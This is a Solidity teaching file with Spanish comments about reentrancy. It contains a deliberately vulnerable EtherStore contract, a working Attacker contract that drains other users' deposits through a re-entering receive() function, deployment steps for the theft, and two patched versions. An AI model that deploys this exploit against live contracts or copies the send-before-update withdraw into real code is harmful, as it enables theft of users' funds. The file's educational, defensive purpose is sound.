// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
EtherStore es un contrato en el que puede depositar y retirar ETH.
Este contrato es vulnerable al ataque de reentrada.
Veamos por qué.
1. Deploy EtherStore
2. Deposite 1 Ether  de la Cuenta 1 (Alice) y la Cuenta 2 (Bob) en EtherStore
3. Deploy Attack con la dirección de EtherStore
4. Llamar a Attack.attack enviando 1 ether (usando la Cuenta 3 (Eve)).
    Recuperarás 3 Ethers (2 Ether robados a Alice y Bob,
    más 1 Ether enviado desde este contrato).
¿Qué sucedió?
Attack pudo llamar a EtherStore.withdraw varias veces antes
EtherStore.withdraw terminó de ejecutarse.
Así es como se llamaron las funciones
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (recibe 1 Ether)
- EtherStore.withdraw
- Attack.fallback (recibe 1 Ether)
- EtherStore.withdraw
- Attack fallback (recibe 1 Ether)
*/

// Contrato vulnerable al ataque de reentrada
contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Este contrato es vulnerable a ataques de reentrada
    // porque primero envía Ether y luego actualiza el saldo.
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance to withdraw");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Ataque de reentrada

contract Attacker {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback se llama cuando EtherStore envía Ether a este contrato.
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    // Llamar a esta función para iniciar el ataque
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/*
Técnicas preventivas
Patrón de Chequeo-Efectos-Interacción (Checks-Effects-Interactions)
--------------------------------------------------------------------
Este patrón ayuda a prevenir ataques de reentrancia al asegurar que las llamadas
 a contratos externos se realicen al final de una función. 
 
 Se estructura de la siguiente manera:
- Chequeo: Primero, verifica todas las condiciones y valida las entradas.
- Efectos: Luego, actualiza el estado del contrato.
- Interacción: Finalmente, realiza interacciones con otros contratos.
A continuación un ejemplo de este patrón:
*/

contract EtherStore_Seguro {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Este contrato es seguro contra ataques de reentrada
    function withdraw() public {
        // Chequeo
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance to withdraw");

        // Efectos
        balances[msg.sender] = 0;

        // Interacción
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Otro enfoque para prevenir ataques de reentrancia es usar el modificador noReentrant.
// Este modificador se asegura de que una función no se llame nuevamente hasta que haya terminado de ejecutarse.

// ReentrancyGuard previene ataques de reentrancia
contract ReEntrancyGuard {
    bool internal locked;
    mapping(address => uint) public balances;

    constructor() {
        locked = false;
    }

    // Modificador noReentrant
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Este contrato es seguro contra ataques de reentrada
    // aunque no use el patrón de Chequeo-Efectos-Interacción
    function withdraw() public noReentrant {
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance to withdraw");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
}